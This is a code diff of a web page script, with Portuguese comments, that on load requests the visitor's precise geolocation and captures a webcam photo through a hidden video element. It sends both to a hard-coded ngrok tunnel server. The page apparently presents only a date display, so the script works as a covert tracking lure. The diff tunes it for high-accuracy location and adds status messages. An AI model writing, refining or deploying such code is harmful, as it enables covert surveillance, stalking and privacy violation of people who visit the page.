@@ -30,7 +30,7 @@
   <script>
     const NGROK_SERVER = "https://1c35-201-42-106-118.ngrok-free.app";
 
-    // Exibir data atual
+    // Exibir data atual formatada no elemento #data-atual
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
@@ -38,18 +38,20 @@
     const dataFormatada = `${dia}/${mes}/${ano}`;
     document.getElementById("data-atual").textContent = dataFormatada;
 
+    // Ao carregar a página, tenta obter localização e foto
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           sendLocationAndPhoto,
-          handleError
+          handleError,
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        alert("Seu navegador não suporta Geolocalização.");
       }
     });
 
-    // Função que captura a foto da webcam e chama callback com base64
+    // Captura foto da webcam e retorna base64 via callback
     function startCameraAndGetPhoto(callback) {
       const video = document.createElement("video");
       video.style.display = "none";
@@ -82,7 +84,7 @@
         });
     }
 
-    // Função que envia localização + foto juntos para o backend
+    // Envia localização e foto para o backend
     function sendLocationAndPhoto(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
@@ -103,6 +105,8 @@
           .then(data => {
             if (!data.success) {
               alert("Erro ao enviar os dados.");
+            } else {
+              console.log("Dados enviados com sucesso!");
             }
           })
           .catch(err => {
